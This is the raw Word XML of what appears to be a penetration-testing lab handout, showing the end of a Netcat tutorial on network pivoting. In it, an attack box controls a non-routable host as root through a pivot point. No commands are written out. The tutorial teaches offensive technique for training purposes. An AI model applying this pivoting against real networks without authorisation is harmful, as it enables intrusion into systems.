    <w:p w14:paraId="1C09A2AA" w14:textId="231F01DB" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>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417FF0AD" wp14:editId="2F6DD206">
            <wp:extent cx="5724525" cy="3695700"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="1" name="Picture 1" descr="7 - Linux netcat network pivo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 Linux netcat network pivoting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noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B21446"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Network pivoting with Netcat on Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C083F8"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On the attack box terminal, we have issued the whoami and ifconfig commands. The output of whoami is root and ifconfig outputs the IP information for host 10.11.1.95. This setup works perfectly, and we are able to control the target host which is on network that is not routable from the attack box network by pivoting the connection through the pivot point. This scenario may seem a bit confusing at first but don’t worry. Take your time to understand and maybe practice this situation to get a better understanding of what is exactly happening.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E937FF5" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="0" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>So far we have learned about piping Netcat output such as port scan results and connections. We also learned how to use pivot points on Linux and Windows to pivot network connections. Do you have more ideas for advanced techniques and Netcat tutorials? Please let us know by using the comment functionality and we will be adding new techniques to this tutorial.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA0C30F" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F"/>
    <w:p w14:paraId="6654EFBA" w14:textId="77777777" w:rsidR="00176542" w:rsidRDefault="00176542"/>
    <w:sectPr w:rsidR="0017654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AAA8E" w14:textId="77777777" w:rsidR="00004318" w:rsidRDefault="00004318" w:rsidP="00B204EC">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="060B71AC" w14:textId="77777777" w:rsidR="00004318" w:rsidRDefault="00004318" w:rsidP="00B2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726B0" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRDefault="00B20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40691"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="705B8A4F" w14:textId="592024B7" w:rsidR="00B204EC" w:rsidRDefault="00B204EC">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
          <w:jc w:val="right"/>
        </w:pPr>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="000B640F">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="02D5EBF1" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRPr="00B204EC" w:rsidRDefault="00B204EC" w:rsidP="00B204EC">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
      <w:rPr>
        <w:b w:val="0"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00B204EC">
      <w:rPr>
        <w:b w:val="0"/>
      </w:rPr>
      <w:t>© 201</w:t>
    </w:r>
    <w:r w:rsidR="00B770AC">
      <w:rPr>
        <w:b w:val="0"/>
      </w:rPr>
      <w:t>8</w:t>
    </w:r>
    <w:r w:rsidRPr="00B204EC">
      <w:rPr>
        <w:b w:val="0"/>
      </w:rPr>
      <w:t xml:space="preserve"> syberoffense.com All Rights Reserved</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="63C93E1C" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRDefault="00B20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7B37" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRDefault="00B2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A99F8" w14:textId="77777777" w:rsidR="00004318" w:rsidRDefault="00004318" w:rsidP="00B204EC">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3DFE328D" w14:textId="77777777" w:rsidR="00004318" w:rsidRDefault="00004318" w:rsidP="00B20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A7E0D" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRDefault="00B20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A7B9B" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRDefault="00B204EC">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="33E880CD" wp14:editId="79A2123C">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="column">
            <wp:posOffset>95250</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="paragraph">
            <wp:posOffset>-352425</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="1859280" cy="11645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F47D2" w14:textId="77777777" w:rsidR="00B204EC" w:rsidRDefault="00B2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2928"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="411E8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04314"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="26DE9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27D4F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1564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05D87"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8CFC1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F39A3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9FD0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3MDE1MzA2MzQyMDVU0lEKTi0uzszPAykwqgUAGBnHOSwAAAA="/>
  </w:docVars>
  <w:rsids>
    <w:rsidRoot w:val="000B640F"/>
    <w:rsid w:val="00004318"/>
    <w:rsid w:val="000B640F"/>
    <w:rsid w:val="00176542"/>
    <w:rsid w:val="004237F5"/>
    <w:rsid w:val="0062173B"/>
    <w:rsid w:val="00794DE2"/>
    <w:rsid w:val="00B204EC"/>
    <w:rsid w:val="00B7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93DF"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{25664262-12B4-43C7-8E25-CFAE228C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EC"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00B204EC"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00B204EC"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00B20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at\Dropbox\SyberOffense%20School%20Build\Labs\SyberOffense%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SyberOffense Lab Template.dotx</Template>
  <TotalTime>0</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K</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Professor K</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-02-07T08:05:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-02-07T08:05:00Z</dcterms:modified>
</cp:coreProperties>
</file>